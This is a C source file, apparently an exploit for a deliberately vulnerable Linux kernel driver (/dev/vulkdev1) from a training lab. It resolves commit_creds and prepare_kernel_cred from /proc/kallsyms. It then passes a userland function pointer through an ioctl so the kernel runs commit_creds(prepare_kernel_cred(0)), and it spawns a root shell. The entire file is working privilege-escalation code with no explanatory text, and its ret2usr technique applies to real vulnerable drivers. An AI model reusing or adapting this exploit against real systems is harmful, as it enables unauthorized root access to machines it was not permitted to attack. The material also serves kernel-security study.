#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define VULDEV_MAGIC 'k'
#define VULDEV_START_CMD	_IOWR(VULDEV_MAGIC, 1, unsigned long*)
#define VULDEV_STOP_CMD		_IO(VULDEV_MAGIC, 2)

#define VULKDEV_DEVICE "/dev/vulkdev1"

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int kernel_code()
{
	commit_creds(prepare_kernel_cred(0));
	return 0;
}

unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f)
		return 0;
  
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
	return 0;
}
 

int main(int argc, char* argv[])
{
	int fd;

	fd = open(VULKDEV_DEVICE, O_RDWR | O_NONBLOCK);
	if (fd == -1) {
		printf("open vulkdev fail\n");
		exit(1);
	}

	commit_creds = (_commit_creds) get_symbol("commit_creds");
	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
	printf("commit_creds = %p; prepare_kernel_cred = %p; kernel_code = %p\n", 
			commit_creds, prepare_kernel_cred, kernel_code);
	printf("getuid() = %d\n", getuid());
	ioctl(fd, VULDEV_START_CMD, kernel_code);
	if (!getuid())
		system("/bin/sh");
	close(fd);
	return 0;
}
